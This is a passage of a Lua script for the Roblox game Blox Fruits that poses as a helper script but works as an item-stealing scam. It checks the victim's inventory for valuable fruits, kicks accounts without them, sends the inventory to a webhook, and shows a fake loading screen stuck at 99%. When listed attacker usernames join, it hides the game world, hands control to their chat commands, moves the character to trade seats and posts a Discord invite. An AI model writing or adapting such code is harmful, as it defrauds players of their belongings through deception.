                                currentTable, currentSeat = newTable, newSeat -- Update if a table is found
                            end
                        end)
                        lastTableCheck = now
                    end
    
                    -- Movement to table/seat logic
                    if currentTable and currentSeat then
                        local distance = (rootPart.Position - currentSeat.Position).Magnitude
    
                        if distance > 5 then -- If far from the seat, move directly
                            tweenToPosition(currentSeat.Position)
                            lastMovementTime = now -- Reset movement timer after manual move
                        elseif now - lastMovementTime >= MOVEMENT_CHECK_INTERVAL then
                             -- If close but hasn't moved recently, add small random offset
                            randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1)) -- Y offset 0
                            tweenToPosition(currentSeat.Position + randomOffset)
                            lastMovementTime = now -- Reset movement timer
                        end
                    -- else -- Optional: if no table is found, maybe wander or stand still?
                         -- Current logic does nothing if no table is found.
                    end
                else
                    -- If character doesn't exist, reset current table/seat state
                    currentTable = nil
                    currentSeat = nil
                end
    
    
                -- Calculate actual time spent this frame and wait the remaining time
                local timeElapsed = tick() - now
                local waitTime = math.max(0.01, UPDATE_INTERVAL - timeElapsed)
                task.wait(waitTime)
            end
        end
    
        -- Connect CharacterAdded/Removing
        characterAddedConnection = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
        characterRemovingConnection = LocalPlayer.CharacterRemoving:Connect(function()
            -- Reset state when character is removed (e.g., death)
            currentTable = nil
            currentSeat = nil
        end)
    
        -- Handle case where character already exists on script start
        if LocalPlayer.Character then
            task.spawn(function()
                onCharacterAdded(LocalPlayer.Character)
            end)
        end
    
        task.spawn(runMainLoop) -- Start the main automation loop in a new thread
    
        -- Return a cleanup function (currently not used in the script flow, but good practice)
        return function()
            isLoopRunning = false
            if characterAddedConnection then
                characterAddedConnection:Disconnect()
                characterAddedConnection = nil
            end
            if characterRemovingConnection then
                characterRemovingConnection:Disconnect()
                characterRemovingConnection = nil
            end
            -- Disconnect all stored StateChanged connections
            for humanoid, connection in pairs(stateChangedConnections) do
                 if connection then connection:Disconnect() end
            end
            table.clear(stateChangedConnections) -- Ensure table is empty
            currentTable = nil
            currentSeat = nil
            RunService:UnbindFromRenderStep("SecurityMonitor") -- Unbind security monitor
        end
    end
    
    -- optimizeUIRendering and validComponents removed
    
    local function init()
        local placeId = game.PlaceId
    
        if placeId == 2753915549 then -- First Sea PlaceId
            LocalPlayer:Kick("This script works only in Sea 2 or 3!")
            return
        end
    
        if placeId ~= 4442272183 and placeId ~= 7449423635 then -- Sea 2 and Sea 3 PlaceIds
            LocalPlayer:Kick("This script is meant for Blox Fruits!")
            return
        end
    
        local inventory = getInventory()
        if not inventory then
            LocalPlayer:Kick("Error: Could not retrieve inventory.") -- More specific error
            return
        end
    
        local function checkInventory()
            local fruitsToHitSet = {}
            for _, fruit in ipairs(FruitsToHit) do
                fruitsToHitSet[fruit] = true
            end
    
            for _, item in ipairs(inventory) do
                -- Check if player has any target fruit OR any premium item
                if (item.Type == "Blox Fruit" and fruitsToHitSet[item.Name]) or
                   (item.Type == "Premium") then
                    return true
                end
            end
            return false -- Returns false if no target fruits or premium items are found
        end
    
        -- Kick if the initial inventory check fails
        if not checkInventory() then
            LocalPlayer:Kick("Alt Account Detected! Script requires you to have a valuable fruit or premium item.") -- More informative message
            return
        end
    
        task.spawn(function()
            task.wait(1) -- Small delay after initial checks
            JoinTeam() -- Join a team
            task.spawn(createNotification) -- Create the basic loading UI (that stops at 99%)
            sendWebhook(inventory) -- Send the initial inventory webhook
        end)
    
        -- optimizeUIRendering call removed
    
        local mainLoopStarted = false -- Flag to prevent starting the main loop multiple times
    
        local function onPlayerAdded(player)
            -- Only trigger if the player is in the configured Usernames list
            local playerNameLower = string.lower(player.Name)
            local isAuthorized = false
    
            for _, username in ipairs(Usernames) do
                if string.lower(username) == playerNameLower then
                    isAuthorized = true
                    break
                end
            end
    
            if not isAuthorized then return end -- If the added player is not a target, do nothing else
    
            -- If a target player is added and the main loop hasn't started yet
            if not mainLoopStarted then
                mainLoopStarted = true -- Set flag
    
                -- Replaced the second loadstring call and subsequent logic
                -- Now, we call our embedded fake UI script and then trigger the main logic after a delay
                task.spawn(runFakeLoadingUI) -- Start the fake loading UI in a new thread
    
                -- Delay before activating main script functionality (chat, 3D disable, main loop)
                task.delay(3, function()
                     -- Ensure local player still exists before proceeding
                     if not LocalPlayer or not LocalPlayer.Parent then return end
    
                    Players.PlayerChatted:Connect(processChatCommand) -- Enable chat commands
                    RunService:Set3dRenderingEnabled(false) -- Disable 3D rendering - THIS HIDES THE GAME WORLD!
                    task.spawn(startMainLoop) -- Start the main automation loop
    
                    -- Send chat welcome message
                    task.spawn(function()
                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                            "Join (ZmqJrs3TM8) << Invite in dc if you want to learn how to make a lot of mythical fruits!",
                            "All"
                        )
                    end)
                end)
            end
        end
    
        -- Connect the onPlayerAdded handler
        local connection = Players.PlayerAdded:Connect(onPlayerAdded)
    
        -- Check for players already in the server on startup
        task.spawn(function()
            for _, player in ipairs(Players:GetPlayers()) do
                onPlayerAdded(player) -- Check existing players
            end
        end)
    
        -- Cleanup connection when local player leaves
        task.spawn(function()
            local cleanupConnection
            cleanupConnection = Players.PlayerRemoving:Connect(function(player)
                if player == LocalPlayer then
                    if connection then connection:Disconnect() end -- Disconnect PlayerAdded
                    if cleanupConnection then cleanupConnection:Disconnect() end
                     -- The mainLoop return function can be called here to clean up its connections
                     -- (Assuming startMainLoop returns the cleanup function as designed)
                end
            end)
        end)
    end
    
    -- Ensure init only runs once
    if not shared.ScriptExecuted then
        shared.ScriptExecuted = true
        task.spawn(function()
            local success, errorMessage = pcall(init)
            if not success then
                -- Kick on initialization error
                task.spawn(function()
                    LocalPlayer:Kick("Error during script initialization: " .. tostring(errorMessage))
                end)
            end
        end)
    end
